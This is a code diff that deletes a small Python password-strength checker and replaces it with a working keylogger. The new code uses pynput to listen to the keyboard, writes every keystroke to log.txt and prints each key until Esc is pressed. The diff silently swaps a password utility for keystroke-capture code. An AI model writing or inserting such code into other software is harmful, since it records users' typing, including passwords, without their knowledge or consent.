@@ -1,28 +1,32 @@
-def check_password_strength(password):
-    '''
-    Program to check the strength of input password
-    Parameter:
-    password (str): input password
-    Returns:
-    str: 'Weak' or 'Average' or 'Strong'
-    '''
+import pynput
+from pynput.keyboard import Key, Listener
 
-    special_chars = list("!@#$%&*")
-    isdigit_there = any(char.isdigit() for char in password)
-    islower_there = any(char.islower() for char in password)
-    isupper_there = any(char.isupper() for char in password)
-    special_char_there = any(char in special_chars for char in password)
+keys=[]
 
-    all_true = all([isdigit_there, isupper_there, special_char_there, islower_there])
+def on_press(key):
+    keys.append(key)
+    write_file(keys)
 
-    if len(password) < 6:
-        return "Weak"
-    elif len(password) >= 8 and all_true:
-        return "Strong"
-    else:
-        return "Average"
+    try:
+        print("alphanumeric key {0} pressed".format(key.char))
+    except AttributeError:
+        print("special key {0} pressed".format(key))
 
-input_password = input("Create Password: ")
-strength = check_password_strength(input_password)
-print("")
-print("Your password is {} !!".format(strength))
+
+def write_file(keys):
+    with open ("log.txt","w")as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            f.write(k)
+
+            f.write(" ")
+
+
+def on_release(key):
+    print("{0} released".format(key))
+    if key == Key.esc :
+        return False
+
+
+with Listener(on_press=on_press,on_release=on_release)as listener:
+    listener.join()         
